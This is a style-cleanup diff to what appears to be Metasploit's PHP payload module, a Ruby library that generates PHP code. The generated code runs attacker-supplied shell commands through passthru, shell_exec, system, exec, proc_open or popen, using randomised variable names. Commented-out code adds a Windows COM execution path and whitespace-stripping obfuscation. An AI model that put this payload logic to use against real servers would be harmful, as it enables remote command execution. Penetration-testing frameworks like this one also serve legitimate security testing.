@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'msf/core'
 
@@ -5,7 +6,6 @@ require 'msf/core'
 #
 ###
 module Msf::Payload::Php
-
   #
   # Generate a chunk of PHP code that should be eval'd before
   # #php_system_block.
@@ -19,7 +19,7 @@ module Msf::Payload::Php
   #
   def php_preamble(options = {})
     dis = options[:disabled_varname] || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
-    dis = '$' + dis if (dis[0,1] != '$')
+    dis = '$' + dis if dis[0, 1] != '$'
 
     @dis = dis
 
@@ -36,7 +36,7 @@ module Msf::Payload::Php
         #{dis}=array();
       }
       "
-    return preamble
+    preamble
   end
 
   #
@@ -58,13 +58,11 @@ module Msf::Payload::Php
     dis = options[:disabled_varname] || @dis || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
     output = options[:output_varname] || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
 
-    if (@dis.nil?)
-      @dis = dis
-    end
+    @dis = dis if @dis.nil?
 
-    cmd    = '$' + cmd if (cmd[0,1] != '$')
-    dis    = '$' + dis if (dis[0,1] != '$')
-    output = '$' + output if (output[0,1] != '$')
+    cmd    = '$' + cmd if cmd[0, 1] != '$'
+    dis    = '$' + dis if dis[0, 1] != '$'
+    output = '$' + output if output[0, 1] != '$'
 
     is_callable = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
     in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
@@ -123,7 +121,7 @@ module Msf::Payload::Php
     # Currently unused until we can figure out how to get output with COM
     # objects (which are not subject to safe mode restrictions) instead of
     # PHP functions.
-    #win32_com = "
+    # win32_com = "
     #	if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
     #		$wscript = new COM('Wscript.Shell');
     #		$wscript->run(#{cmd} . ' > %TEMP%\\out.txt');
@@ -137,7 +135,7 @@ module Msf::Payload::Php
 
     exec_methods = [passthru, shell_exec, system, exec, proc_open, popen].sort_by { rand }
     buf = setup + exec_methods.join("") + fail_block
-    #buf = Rex::Text.compress(buf)
+    # buf = Rex::Text.compress(buf)
 
     ###
     # All of this junk should go in an encoder
@@ -153,8 +151,8 @@ module Msf::Payload::Php
     # function definitions, which require a space between the "function"
     # keyword and the name, means we can completely remove spaces.
     #
-    #alpha_used = { 95 }
-    #buf.gsub!(/'(.*?)'/) {
+    # alpha_used = { 95 }
+    # buf.gsub!(/'(.*?)'/) {
     #	str_array = []
     #	$1.each_byte { |c|
     #		if (('a'..'z').include?(c.chr))
@@ -166,16 +164,15 @@ module Msf::Payload::Php
     #	}
     #	str_array.last.chop!
     #	str_array.join("")
-    #}
-    #if (alpha_used.length > 1)
+    # }
+    # if (alpha_used.length > 1)
     #	alpha_used.each_key { |k| buf = "$#{k.chr}=chr(#{k});" + buf }
-    #end
+    # end
     #
-    #buf.gsub!(/\s*/, '')
+    # buf.gsub!(/\s*/, '')
     #
     ###
 
-    return buf
-
+    buf
   end
 end
